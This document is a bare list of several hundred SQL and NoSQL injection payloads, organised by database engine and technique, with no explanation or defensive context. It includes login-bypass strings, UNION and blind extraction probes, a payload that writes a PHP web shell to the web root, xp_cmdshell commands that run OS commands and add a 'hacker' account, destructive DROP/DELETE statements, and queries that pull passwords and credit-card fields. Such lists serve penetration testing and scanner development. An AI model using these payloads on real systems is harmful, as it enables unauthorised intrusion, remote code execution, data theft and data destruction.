# SQL Injection Payloads Collection - 300+ Payloads
# ==============================================

# Basic SQL Injection
' OR '1'='1
' OR 1=1--
' OR '1'='1' --
'; DROP TABLE users;--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
1' AND 1=1--
1' AND 1=2--
admin'--
' OR 'a'='a
') OR ('1'='1
' OR 1=1#
1; SELECT * FROM users--

# MySQL Specific
' OR '1'='1' /*
' UNION SELECT user()--
' UNION SELECT version()--
' UNION SELECT database()--
' UNION SELECT @@version--
' UNION SELECT @@datadir--
' AND SLEEP(5)--
' OR SLEEP(5)--
' UNION SELECT SLEEP(5)--
'; SELECT SLEEP(5)--
' AND BENCHMARK(1000000,MD5(1))--
' OR BENCHMARK(1000000,MD5(1))--
' UNION ALL SELECT NULL,NULL,NULL WHERE 1=1--
' UNION SELECT user(),version(),database()--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns--
' UNION SELECT table_schema,table_name FROM information_schema.tables--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND LENGTH(database())>0--
' AND ASCII(SUBSTRING(database(),1,1))>64--
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php'--

# PostgreSQL Specific
'; SELECT version()--
' UNION SELECT version()--
' UNION SELECT current_user--
' UNION SELECT current_database()--
' AND pg_sleep(5)--
' OR pg_sleep(5)--
' UNION SELECT pg_sleep(5)--
'; SELECT pg_sleep(5)--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns--
' UNION SELECT usename FROM pg_user--
' UNION SELECT datname FROM pg_database--
' UNION SELECT pg_read_file('/etc/passwd')--

# MSSQL Specific
'; SELECT @@version--
' UNION SELECT @@version--
' UNION SELECT DB_NAME()--
' UNION SELECT USER_NAME()--
' UNION SELECT SYSTEM_USER--
'; WAITFOR DELAY '00:00:05'--
' OR WAITFOR DELAY '00:00:05'--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns--
' UNION SELECT name FROM sys.databases--
' UNION SELECT name FROM sys.tables--
' UNION SELECT name FROM sys.columns--
'; EXEC xp_cmdshell('whoami')--
' UNION SELECT 1,2,3; EXEC xp_cmdshell('dir')--

# Oracle Specific
' UNION SELECT banner FROM v$version--
' UNION SELECT user FROM dual--
' UNION SELECT * FROM all_users--
' UNION SELECT * FROM all_tables--
' UNION SELECT column_name FROM all_tab_columns--
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('',5)--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('',5)--
' UNION SELECT NULL FROM dual WHERE 1=1--
' UNION SELECT table_name FROM all_tables--
' UNION SELECT username FROM all_users--

# SQLite Specific
' UNION SELECT sql FROM sqlite_master--
' UNION SELECT tbl_name FROM sqlite_master--
' UNION SELECT name FROM sqlite_master--
' UNION SELECT sqlite_version()--

# Blind SQL Injection - Boolean Based
' AND 1=1--
' AND 1=2--
' AND 'a'='a'--
' AND 'a'='b'--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM admin)>0--
' AND (SELECT LENGTH(database()))>0--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--

# Blind SQL Injection - Time Based
' AND SLEEP(5) AND '1'='1
' OR SLEEP(5) AND '1'='1
' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)--

# Union Based with Different Column Counts
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,2,3,4,5,6--
' UNION SELECT 1,2,3,4,5,6,7--
' UNION SELECT 1,2,3,4,5,6,7,8--
' UNION ALL SELECT 1,2,3--
' UNION ALL SELECT NULL,NULL,NULL--

# Error Based Injection
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))--

# Stacked Queries
'; INSERT INTO users VALUES('admin','password')--
'; UPDATE users SET password='pwned' WHERE username='admin'--
'; DELETE FROM users WHERE id=1--
'; CREATE TABLE temp(data VARCHAR(255))--
'; EXEC xp_cmdshell('net user hacker password123 /add')--

# Alternative Comment Styles
' OR '1'='1' /*
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1'-- -
' OR '1'='1'--
' OR '1'='1';--

# Encoding Bypasses
%27%20OR%20%271%27%3D%271
' OR CHR(49)=CHR(49)--
' OR ASCII(49)=ASCII(49)--
' OR 0x31=0x31--
' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
' UNION SELECT 0x31,0x32,0x33--

# Alternative Operators
' || '1'='1
' && '1'='1
' | '1'='1
' & '1'='1
' ^ 0 = 0--
' + '1'='1
' - 0 = 0--
' * 1 = 1--
' / 1 = 1--
' % 2 = 1--

# Function Based
' AND EXISTS(SELECT * FROM users)--
' AND NOT EXISTS(SELECT * FROM nonexistent)--
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT MAX(id) FROM users) > 0--
' AND (SELECT MIN(id) FROM users) > 0--
' AND (SELECT TOP 1 username FROM users)='admin'--

# Subquery Injection
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
' AND (SELECT 'a' FROM users WHERE id=1)='a'--
' AND 1=(SELECT COUNT(*) FROM users)--
' AND 1<(SELECT COUNT(*) FROM users)--
' AND 1>(SELECT COUNT(*) FROM users)--

# Regular Expression Based
' AND 1 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
' AND 'admin' REGEXP '^[a-d]'--

# JSON Injection
' UNION SELECT JSON_EXTRACT('{}','$.test')--
' AND JSON_EXTRACT('{"test":1}','$.test')=1--

# XML Injection
' UNION SELECT EXTRACTVALUE('<root><test>1</test></root>','/root/test')--

# NoSQL Injection Attempts
' || '1'=='1
' && '1'=='1
{"$ne":null}
{"$regex":".*"}
{"$where":"1==1"}

# Second-order SQL Injection
admin'; DROP TABLE users; --
test\'; SELECT * FROM users; --
user"'; EXEC xp_cmdshell('calc'); --

# Advanced Bypasses
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /**/UNION/**/SELECT/**/1,2,3--
' %55NION %53ELECT 1,2,3--
' UniOn sEleCt 1,2,3--
' /*!50000UNION SELECT*/ 1,2,3--
' /*!12345UNION SELECT*/ 1,2,3--

# Context-specific Payloads
1' UNION SELECT 1,2,3--
1) UNION SELECT 1,2,3--
1)) UNION SELECT 1,2,3--
1))) UNION SELECT 1,2,3--
') UNION SELECT 1,2,3--
')) UNION SELECT 1,2,3--
"') UNION SELECT 1,2,3--

# Concatenation Bypasses
' UNION SELECT CONCAT('a','b')--
' UNION SELECT 'a'+'b'--
' UNION SELECT 'a'||'b'--
' UNION SELECT CONCAT_WS(':','a','b')--

# Case Manipulation
' UnIoN sElEcT 1,2,3--
' uNiOn SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--

# Alternative Whitespace
' UNION	SELECT	1,2,3--
' UNION
SELECT
1,2,3--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3--
' UNION
SELECT
1,2,3--
' UNION SELECT 1,2,3--

# Length-based Detection
' AND LENGTH((SELECT database()))>1--
' AND LENGTH((SELECT user()))>1--
' AND LENGTH((SELECT version()))>1--

# Conditional Responses
' AND IF(1=1,'true','false')='true'--
' AND CASE WHEN 1=1 THEN 'true' ELSE 'false' END='true'--

# Database Fingerprinting
' AND 'mysql'='mysql'--
' AND 'postgresql'='postgresql'--
' AND 'microsoft'='microsoft'--
' AND 'oracle'='oracle'--

# Data Exfiltration Attempts
' UNION SELECT username,password FROM users--
' UNION SELECT email,password FROM admin--
' UNION SELECT * FROM config--
' UNION SELECT * FROM settings--
' UNION SELECT credit_card,cvv FROM payments--
